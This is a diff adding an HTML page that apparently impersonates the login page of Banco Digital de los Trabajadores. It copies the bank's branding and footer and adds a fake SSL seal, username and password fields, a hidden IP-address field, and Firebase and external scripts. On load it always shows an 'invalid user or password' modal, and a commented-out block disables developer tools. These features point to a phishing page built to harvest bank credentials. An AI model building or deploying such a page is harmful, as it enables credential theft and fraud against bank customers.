@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="utf-8" />
+  <title>Bicentenario</title>
+  <meta name="description" content />
+  <meta name="author" content="Luis Eduardo Perez" />
+  <meta name="description" content />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <link rel="stylesheet" href="../styles/style.css" />
+  <link rel="stylesheet" href="../styles/custom.css">
+  <meta name="msapplication-TileColor" content="#b91d47" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="referrer" content="no-referrer" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="img/shorcut.png" type="image/x-icon" />
+  <link rel="icon" href="../img/favicon.png" type="image/x-icon" />
+  <!-- SweetAlert2 (para modal de error) -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+  <style>
+    /* Estilos del modal (igual a err-p=1.html / err-passwd.html) */
+    .swal2-container { background: rgba(0, 0, 0, 0.45) !important; }
+    .swal2-popup {
+      width: 500px !important;
+      min-height: 295px !important;
+      padding: 25px !important;
+      border-radius: 6px !important;
+      font-family: Arial, Helvetica, sans-serif !important;
+    }
+    .swal2-title {
+      margin: 0 0 10px 0 !important;
+      font-weight: 600 !important;
+      font-size: 20px !important;
+    }
+    #swal2-content, .swal2-html-container {
+      font-size: 18px !important;
+      color: #3f4254 !important;
+      text-align: center !important;
+      margin: 10px 0 10px 0 !important;
+      padding: 0 !important;
+    }
+    .swal2-icon.swal2-error {
+      transform: scale(1.60);
+      transform-origin: center;
+      margin: 20px auto 15px auto !important;
+    }
+    .swal2-styled.swal2-confirm {
+      background-color: rgb(48, 133, 214) !important;
+      border-left-color: rgb(48, 133, 214) !important;
+      border-right-color: rgb(48, 133, 214) !important;
+      border-top-color: rgb(48, 133, 214) !important;
+      border-bottom-color: rgb(48, 133, 214) !important;
+      font-size: 16px !important;
+      padding: 10px 24px !important;
+      border-radius: 4px !important;
+    }
+    .swal2-actions { margin: 0 !important; }
+    .swal2-styled:focus { box-shadow: 0 0 0 3px rgba(48,133,214,0.35) !important; }
+  </style>
+  <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
+  <script type="module" src="../js/firebase-config.js"></script>
+</head>
+
+<body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
+  <!-- <script>
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    document.onkeydown = function(e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+        return false;
+      }
+    };
+    setTimeout(() => {
+  if (window.console) {
+    console.log('%c¡Detente!', 'color: red; font-size: 40px; font-weight: bold;');
+    console.log('%cEsta función es solo para desarrolladores. No pegues aquí nada que no entiendas.', 'font-size: 16px;');
+    console.log('Ver más en: https://ejemplo.com/selfxss');
+  }
+}, 1000);
+
+  </script> -->
+  <div id="main" role="main" class="mainRegister">
+    <div id="content" class="container" style="opacity: 1">
+      <form id="login-form" novalidate>
+        <input type="hidden" id="direccionIP" name="DireccionIP" />
+        <div class="modal-dialog demo-modal">
+          <div class="modal-content">
+            <div class="modal-header">
+              <!-- Logo BDT sobre form -->
+              <h4 class="modal-title text-center mt-1">
+                <img src="../img/logo.png" alt srcset style="width: 80%" sizes />
+              </h4>
+              <!-- Fin logo -->
+            </div>
+            <div class="modal-body smart-form client-form" style="padding: 10px">
+              <!-- Contraseña -->
+              <div class="row">
+                <section id="section-jrico" class="col col-6">
+                  <label for="" class="label"><strong>
+                      Nombre de Usuario
+                    </strong></label>
+                  <label class="input">
+                    <i class="icon-append fa fa-user"></i>
+                    <input type="text" name="u" id="u" minlength="8" maxlength="12" autocomplete="off" value="">
+                    <b class="tooltip tooltip-top-right">
+                      <i class="fa fa-lock txt-color-teal"></i>
+                      Ingrese el Nombre de Usuario
+                    </b>
+                  </label>
+                </section>
+                <section id="section-jrico" class="col col-6">
+                  <label for="" class="label">
+                    <strong>
+                      Ingrese su contraseña
+                    </strong>
+                  </label>
+                  <label class="input show-account">
+                    <i id="togglePassword" style="cursor:pointer" class="icon-watch icon-append fa fa-eye-slash" data-watch="0"></i>
+                    <input type="password" name="p" id="p" minlength="8" maxlength="16" autocomplete="off">
+                    <b class="tooltip tooltip-top-right">
+                      Ingrese su Clave
+                    </b>
+                  </label>
+                </section>
+              </div>
+              <div id="preloader" class="cargando text-center">
+                <div>
+                  <img src="/img/shorcut.png" alt="" height="35"> Cargando, Por favor espere un momento...
+                </div>
+              </div>
+              <div class="botones">
+                <div class="row mt-1" style="margin-top: 2em !important;">
+                  <section class="col col-2"></section>
+                  <section class="col col-8 section-btn-passwd">
+                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso btn-passwd" id="cmdLogin">
+                      <i class="fa fa-unlock"></i> Ingresar
+                    </button>
+                  </section>
+                </div>
+                <div class="row mt-1" style="margin-top: 2em !important;">
+                  <section class="col col-1"></section>
+                  <section class="col col-5 text-center">
+                    <a href="javascript:void(0)" type="button" class="btn-link-red margin-top-5" id="cmdRegister"
+                      disabled style="color:#A32337 !important; font-size: 14px;">
+                      <i class="fa fa-home"></i>
+                      Regresar
+                    </a>
+                  </section>
+                  <section class="col col-5 text-center">
+                    <a href="javascript:void(0)" class="btn-link-blue margin-top-5" id="cmdUnlock" disabled
+                      style="color:#A32337 !important; font-size: 14px;">
+                      Olvido de contraseña
+                    </a>
+                  </section>
+                </div>
+                <div class="row">
+                  <div class="col-md-3"></div>
+
+                </div>
+              </div>
+              <div class="clearfix"></div>
+              <p class="text-center mt-1">
+                <strong class="note">
+                  Para mayor información o asesoria contáctanos al <br />
+                  Centro de atención telefónica<br />
+                  0500-6272421
+                </strong>
+              </p>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="page-footer text-start" id="footer">
+    <div class="m-3" style="padding-left: 10%">
+      <strong class="txt-color-white">
+        Banco Digital de los Trabajadores - RIF: G-20009148-7
+        <span class="hidden-xs"> Copyright 2025.</span> Todos los derechos
+        reservados.</strong>
+    </div>
+    <table class="pull-right" style="margin-top: -10px" width="135" border="0" cellpadding="2" cellspacing="0"
+      title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+      <tbody>
+        <tr>
+          <td width="135" align="center" valign="top"></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div id="divSmallBoxes"></div>
+  <div id="divMiniIcons"></div>
+  <div id="divbigBoxes"></div>
+
+  <script type="module" src="../js/jrico.js"></script>
+
+  <!-- Modal de error al cargar la página -->
+  <script>
+    window.addEventListener('DOMContentLoaded', function () {
+      if (window.Swal) {
+        Swal.fire({
+          icon: 'error',
+          title: '',
+          text: 'Usuario o clave inválidos. Por favor verifique e intente de nuevo',
+          confirmButtonText: 'Continuar',
+          allowOutsideClick: false,
+          allowEscapeKey: true,
+          backdrop: true,
+          didOpen: (popup) => {
+            const btn = popup.querySelector('.swal2-confirm');
+            if (btn) btn.focus();
+          }
+        });
+      }
+    });
+  </script>
+
+</body>
+
+</html>
